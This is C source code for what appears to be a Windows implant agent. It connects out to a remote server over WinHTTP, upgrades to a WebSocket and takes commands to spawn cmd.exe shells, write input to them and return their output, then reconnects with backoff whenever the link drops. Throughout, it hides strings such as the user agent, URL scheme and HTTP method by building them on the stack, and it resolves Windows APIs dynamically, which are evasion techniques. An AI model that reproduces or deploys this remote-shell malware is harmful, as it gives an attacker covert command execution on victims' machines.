#include "winhttp_api.h"
#include "protocol.h"
#include "wire.h"
#include "transport.h"
#include "shell.h"
#include "report.h"
#include "identity_headers.h"
#include "types.h"
#include "wintypes.h"
#include "memory.h"
#include "string.h"
#include "logger.h"
#include "kernel32.h"
#include "entry.h"
#include "stackstrings.h"

typedef struct {
    shell_slot *shells;
    int verbose;
    const WINHTTP_API *winhttp;
} agent_ctx;

static unsigned read_u32_le_at(const unsigned char *data, int off)
{
    return (unsigned)data[off]
         | ((unsigned)data[off + 1] << 8)
         | ((unsigned)data[off + 2] << 16)
         | ((unsigned)data[off + 3] << 24);
}

static DWORD handle_open_shell(const agent_ctx *ctx, unsigned int corr_id,
                               unsigned char *reply, DWORD *reply_len)
{
    int id = shell_open(ctx->shells);

    if (id < 0) {
        unsigned char status_error[8];
        status_error[0]=1; status_error[1]=0; status_error[2]=0; status_error[3]=0;
        status_error[4]=0; status_error[5]=0; status_error[6]=0; status_error[7]=0;
        write_u32_le_at(status_error, 4, corr_id);
        MemoryCopy(reply, status_error, sizeof(status_error));
        *reply_len = sizeof(status_error);
        LOG_ERROR("OpenShell failed - replied status 1\n");
        return STATUS_ERROR;
    }

    int pos = 0;
    write_u32_le(reply, &pos, STATUS_OK);
    write_u32_le(reply, &pos, corr_id);
    write_u64_le(reply, &pos, (unsigned long long)id);
    *reply_len = 16;
    LOG_INFO("Shell opened successfully (cmd.exe spawned)\n");
    return STATUS_OK;
}

static DWORD handle_write_shell(const agent_ctx *ctx, const incoming_message *msg,
                                unsigned int corr_id,
                                unsigned char *reply, DWORD *reply_len)
{
    unsigned long long id = 0;
    for (int i = 12; i >= 5; i--)
        id = (id << 8) | msg->data[i];

    shell_slot *slot = shell_lookup(ctx->shells, id);
    int status = STATUS_ERROR;
    if (slot) {
        DWORD end = msg->length;
        while (end > 13 && msg->data[end - 1] == '\0')
            end--;
        if (end > 13 && shell_write(slot, msg->data + 13, end - 13) == 0)
            status = STATUS_OK;
    }

    int pos = 0;
    write_u32_le(reply, &pos, (DWORD)status);
    write_u32_le(reply, &pos, corr_id);
    *reply_len = 8;
    LOG_INFO("Write to shell succeeded\n");
    return (DWORD)status;
}

static DWORD handle_read_shell(const agent_ctx *ctx, const incoming_message *msg,
                               unsigned int corr_id,
                               unsigned char *reply, DWORD *reply_len)
{
    unsigned long long id = 0;
    for (int i = 12; i >= 5; i--)
        id = (id << 8) | msg->data[i];

    shell_slot *slot = shell_lookup(ctx->shells, id);
    if (!slot) {
        unsigned char status_error[8];
        status_error[0]=1; status_error[1]=0; status_error[2]=0; status_error[3]=0;
        status_error[4]=0; status_error[5]=0; status_error[6]=0; status_error[7]=0;
        write_u32_le_at(status_error, 4, corr_id);
        MemoryCopy(reply, status_error, sizeof(status_error));
        *reply_len = sizeof(status_error);
        LOG_ERROR("Read shell - unknown id, status 1\n");
        return STATUS_ERROR;
    }

    unsigned char chunk[8 + SHELL_READ_CHUNK + 1];
    DWORD got = 0;
    int r = shell_read(slot, chunk + 8, SHELL_READ_CHUNK, &got);

    if (r == SHELL_READ_DEAD) {
        unsigned char status_error[8];
        status_error[0]=1; status_error[1]=0; status_error[2]=0; status_error[3]=0;
        status_error[4]=0; status_error[5]=0; status_error[6]=0; status_error[7]=0;
        write_u32_le_at(status_error, 4, corr_id);
        MemoryCopy(reply, status_error, sizeof(status_error));
        *reply_len = sizeof(status_error);
        LOG_ERROR("Shell exited - status 1, slot freed\n");
        return STATUS_ERROR;
    }

    int pos = 0;
    write_u32_le(chunk, &pos, STATUS_OK);
    write_u32_le(chunk, &pos, corr_id);
    chunk[8 + got] = '\0';
    MemoryCopy(reply, chunk, 8 + got + 1);
    *reply_len = 8 + got + 1;
    if (r == SHELL_READ_IDLE)
        LOG_INFO("Read shell - idle\n");
    else
        LOG_INFO("Read shell - data received\n");
    return STATUS_OK;
}

static DWORD handle_close_shell(const agent_ctx *ctx, const incoming_message *msg,
                                unsigned int corr_id,
                                unsigned char *reply, DWORD *reply_len)
{
    unsigned long long id = 0;
    for (int i = 12; i >= 5; i--)
        id = (id << 8) | msg->data[i];

    shell_slot *slot = shell_lookup(ctx->shells, id);
    if (slot) {
        shell_teardown(slot);
        LOG_INFO("Shell closed (cmd.exe terminated)\n");
    } else {
        LOG_INFO("Close shell - not open (still ok)\n");
    }

    int pos = 0;
    write_u32_le(reply, &pos, STATUS_OK);
    write_u32_le(reply, &pos, corr_id);
    *reply_len = 8;
    return STATUS_OK;
}

static int run_session(const agent_ctx *ctx, const WCHAR *url, int *long_lived);

INT32 agent_main(const WCHAR *url)
{
    KERNEL32 kernel;
    if (!KERNEL32_Ctor(&kernel)) {
        LOG_ERROR("Failed to load kernel32.dll\n");
    }

    shell_slot shells[SHELL_POOL_SIZE];

    int backoff_steps[6];

    volatile int *bs = backoff_steps;
    bs[0] = 1;  bs[1] = 2;  bs[2] = 4;  bs[3] = 8;  bs[4] = 16; bs[5] = 32;
    const int backoff_count = 6;
    int backoff_pos = 0;
    agent_ctx ctx;

    MemoryZero(shells, sizeof(shells));
    ctx.shells  = shells;
    ctx.winhttp = NULL;

    int rc = RC_SESSION_LOST;
    while (rc == RC_SESSION_LOST) {
        int long_lived = 0;
        rc = run_session(&ctx, url, &long_lived);
        if (rc == RC_SESSION_LOST) {

            int wait_s = backoff_steps[backoff_pos];

            if (long_lived)
                backoff_pos = 0;
            else if (backoff_pos + 1 < backoff_count)
                backoff_pos++;

            LOG_INFO("[i] connection lost - redialing ...\n");
            kernel.Sleep((DWORD)wait_s * 1000);
        }
    }
    return rc;
}

static int run_session(const agent_ctx *ctx, const WCHAR *url, int *long_lived)
{

    int rc = RC_SESSION_LOST;
    HINTERNET session = NULL, connection = NULL, request = NULL;
    HINTERNET socket = NULL;
    KERNEL32 kernel32;
    if (!KERNEL32_Ctor(&kernel32)) {
        LOG_ERROR("Failed to load kernel32.dll\n");
    }

    WINHTTP_API winhttp;
    if (!WINHTTP_API_Ctor(&winhttp)) {
        LOG_ERROR("Failed to resolve the WinHTTP table\n");
        return RC_LOCAL_ERROR;
    }
    ((agent_ctx *)ctx)->winhttp = &winhttp;

    *long_lived = 0;

    URL_COMPONENTS uc;
    MemoryZero(&uc, sizeof(uc));
    uc.dwStructSize = sizeof(uc);

    WCHAR host[256];
    WCHAR path[2048];
    uc.lpszHostName    = host;  uc.dwHostNameLength = 256;
    uc.lpszUrlPath     = path;  uc.dwUrlPathLength  = 2048;

    if (!winhttp.WinHttpCrackUrl(url, 0, 0, &uc)) {
        LOG_ERROR("WinHttpCrackUrl failed (invalid URL)\n");
        rc = RC_LOCAL_ERROR;
        goto cleanup;
    }
    if (uc.nScheme != INTERNET_SCHEME_HTTP &&
        uc.nScheme != INTERNET_SCHEME_HTTPS) {
        LOG_ERROR("Only http:// and https:// URLs are supported\n");
        rc = RC_LOCAL_ERROR;
        goto cleanup;
    }
    if (uc.dwHostNameLength == 0) {
        LOG_ERROR("URL has no host name\n");
        rc = RC_LOCAL_ERROR;
        goto cleanup;
    }
    BOOL https = (uc.nScheme == INTERNET_SCHEME_HTTPS);

    WCHAR scheme[6];
    if (https) {
        scheme[0]=L'h'; scheme[1]=L't'; scheme[2]=L't'; scheme[3]=L'p';
        scheme[4]=L's'; scheme[5]=0;
    } else {
        scheme[0]=L'h'; scheme[1]=L't'; scheme[2]=L't'; scheme[3]=L'p'; scheme[4]=0;
    }
    LOG_INFO("Connecting to remote URL...\n");

    WCHAR ua_buf[18];
    StrUserAgent(ua_buf);
    session = winhttp.WinHttpOpen(ua_buf, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!session) { LOG_ERROR("WinHttpOpen failed\n"); goto cleanup; }

    connection = winhttp.WinHttpConnect(session, uc.lpszHostName, uc.nPort, 0);
    if (!connection) { LOG_ERROR("WinHttpConnect failed\n"); goto cleanup; }

    DWORD request_flags = WINHTTP_FLAG_REFRESH;
    if (https) request_flags |= WINHTTP_FLAG_SECURE;
    WCHAR get_buf[4];
    StrGetMethodW(get_buf);
    request = winhttp.WinHttpOpenRequest(connection, get_buf, uc.lpszUrlPath, NULL, NULL, NULL, request_flags);
    if (!request) { LOG_ERROR("WinHttpOpenRequest failed\n"); goto cleanup; }

    if (!winhttp.WinHttpSetOption(request, WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET, NULL, 0)) {
        LOG_ERROR("WinHttpSetOption UPGRADE_TO_WEB_SOCKET failed\n");
        goto cleanup;
    }

    CHAR headers_a[IDENTITY_HEADERS_SIZE];
    USIZE headers_len = build_identity_headers(headers_a);
    if (headers_len == 0) {
        LOG_ERROR("identity header block does not fit\n");
        rc = RC_LOCAL_ERROR;
        goto cleanup;
    }
    WCHAR headers_w[IDENTITY_HEADERS_SIZE];
    if (AnsiToWide(headers_a, headers_w, IDENTITY_HEADERS_SIZE) < 0) {
        LOG_ERROR("identity header block conversion failed\n");
        rc = RC_LOCAL_ERROR;
        goto cleanup;
    }
    LOG_INFO("Identity headers prepared\n");

    if (!winhttp.WinHttpSendRequest(request, headers_w,(DWORD)headers_len, NULL, 0, 0, 0)) {
        LOG_ERROR("WinHttpSendRequest failed\n"); goto cleanup;
    }

    if (!winhttp.WinHttpReceiveResponse(request, NULL)) {
        LOG_ERROR("WinHttpReceiveResponse failed\n"); goto cleanup;
    }

    socket = winhttp.WinHttpWebSocketCompleteUpgrade(request, 0);
    if (!socket) {
        LOG_ERROR("WinHttpWebSocketCompleteUpgrade failed\n");
        goto cleanup;
    }
    winhttp.WinHttpCloseHandle(request);
    request = NULL;
    LOG_INFO("Connected (HTTP 101 Switching Protocols)\n");

    LOG_INFO("[2] Agent mode: replying to commands (capability mask = Shell)...\n");

    incoming_message msg;
    for (;;) {
        *long_lived = 1;
        BOOL closed = FALSE;

        DWORD err = ws_receive(&winhttp, socket, &msg, &closed);
        if (err != NO_ERROR) {
            LOG_ERROR("WinHttpWebSocketReceive failed\n");
            goto cleanup;
        }
        if (closed) {
            LOG_ERROR("Server closed the connection - redialing.\n");
            goto cleanup;
        }

        unsigned char opcode = (msg.length > 0) ? msg.data[0] : 0xFF;

        unsigned int corr_id = (msg.length >= 5) ? read_u32_le_at(msg.data, 1) : 0;

        if (msg.truncated) {
            unsigned char status_error[8];
        status_error[0]=1; status_error[1]=0; status_error[2]=0; status_error[3]=0;
        status_error[4]=0; status_error[5]=0; status_error[6]=0; status_error[7]=0;
            write_u32_le_at(status_error, 4, corr_id);
            err = ws_send(ctx->winhttp, socket, status_error, sizeof(status_error));
            if (err == NO_ERROR) {
                LOG_ERROR("Message over max size - refused, status 1\n");
                continue;
            }
            LOG_ERROR("Failed to send WebSocket response\n");
            goto cleanup;
        }

        if (opcode == CMD_EXIT) {
            LOG_ERROR("Exit requested - terminating.\n");
            rc = RC_EXIT;
            goto cleanup;
        }

        unsigned char reply[8 + SHELL_READ_CHUNK + 1];
        DWORD reply_len = 0;
        if (opcode == CMD_OPEN_SHELL) {
            err = handle_open_shell(ctx, corr_id, reply, &reply_len);
            if (err == NO_ERROR || err == STATUS_ERROR)
                err = ws_send(ctx->winhttp, socket, reply, reply_len);
        } else if (opcode == CMD_WRITE_SHELL && msg.length >= 13) {
            err = handle_write_shell(ctx, &msg, corr_id, reply, &reply_len);
            if (err == STATUS_OK || err == STATUS_ERROR)
                err = ws_send(ctx->winhttp, socket, reply, reply_len);
        } else if (opcode == CMD_READ_SHELL && msg.length >= 13) {
            err = handle_read_shell(ctx, &msg, corr_id, reply, &reply_len);
            if (err == STATUS_OK || err == STATUS_ERROR)
                err = ws_send(ctx->winhttp, socket, reply, reply_len);
        } else if (opcode == CMD_CLOSE_SHELL && msg.length >= 13) {
            err = handle_close_shell(ctx, &msg, corr_id, reply, &reply_len);
            if (err == STATUS_OK || err == STATUS_ERROR)
                err = ws_send(ctx->winhttp, socket, reply, reply_len);
        } else {
            unsigned char status_error[8];
        status_error[0]=1; status_error[1]=0; status_error[2]=0; status_error[3]=0;
        status_error[4]=0; status_error[5]=0; status_error[6]=0; status_error[7]=0;
            write_u32_le_at(status_error, 4, corr_id);
            err = ws_send(ctx->winhttp, socket, status_error, sizeof(status_error));
            if (err == NO_ERROR) {
                LOG_INFO("Command not implemented - replied status 1\n");
            }
        }
        if (err != NO_ERROR) {
            LOG_ERROR("Failed to send WebSocket response\n");
            goto cleanup;
        }

    }

cleanup:
    if (socket)     winhttp.WinHttpCloseHandle(socket);
    if (request)    winhttp.WinHttpCloseHandle(request);
    if (connection) winhttp.WinHttpCloseHandle(connection);
    if (session)    winhttp.WinHttpCloseHandle(session);
    return rc;
}
